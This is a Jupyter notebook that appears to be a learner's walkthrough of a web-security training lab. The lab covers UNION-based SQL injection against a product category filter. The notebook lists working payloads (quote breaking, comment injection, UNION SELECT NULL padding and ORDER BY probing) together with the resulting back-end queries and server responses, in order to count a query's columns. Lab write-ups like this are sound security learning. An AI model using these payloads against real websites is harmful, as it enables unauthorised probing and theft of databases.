{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# SQL injection UNION attack, determining the number of columns returned by the query\n",
    "\n",
    "- sqli: product category filter\n",
    "- end goal: determine the nuber of columns return by the query"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Analysis\n",
    "\n",
    "- url: `https://0a26006f04f4376180e33fdd00fb0046.web-security-academy.net/`\n",
    "\n",
    "- front-end: `/filter?category=Pets`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from product where category = 'Pets' and released = 1\n",
    "```\n",
    "\n",
    "- check sqli vulnerability\n",
    "- front-end: `/filter?category='`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from product where category = ''' and released = 1\n",
    "'-- 500 Internal server error\n",
    "```\n",
    "- front-end: `/filter?category='--`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from product where category = ''--' and released = 1\n",
    "-- 200 OK: this website have sqli vulnerability\n",
    "```\n",
    "\n",
    "- front-end: `/filter?category=Pets' union select null--`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from product where category = 'Pets' union select null--' and released = 1\n",
    "-- 500 Internal Server Error\n",
    "-- you have to add more null untill you get 200 response\n",
    "```\n",
    "\n",
    "- front-end: `/filter?category=Pets' union select null, null, null--`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from product where category = 'Pets' union select null, null, null--' and released = 1\n",
    "-- 200 OK: this website have 3 columns\n",
    "```\n",
    "\n",
    "- I have another technique\n",
    "- front-end: `/filter?category=Pets' order by 1--`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from product where category = 'Pets' order by 1--' and released = 1\n",
    "-- 200 OK\n",
    "```\n",
    "- this payload didn't give you an error \n",
    "- but you can try to change the number untill you see an error like this\n",
    "- front-end: `/filter?category=Pets' order by 4--`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from product where category = 'Pets' order by 4--' and released = 1\n",
    "-- 500 Internal Server Error\n",
    "-- this website output an error that tell me this website have only 3 columns\n",
    "```\n",
    "- So, you can shoose these technique to find columns\n",
    "\n"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
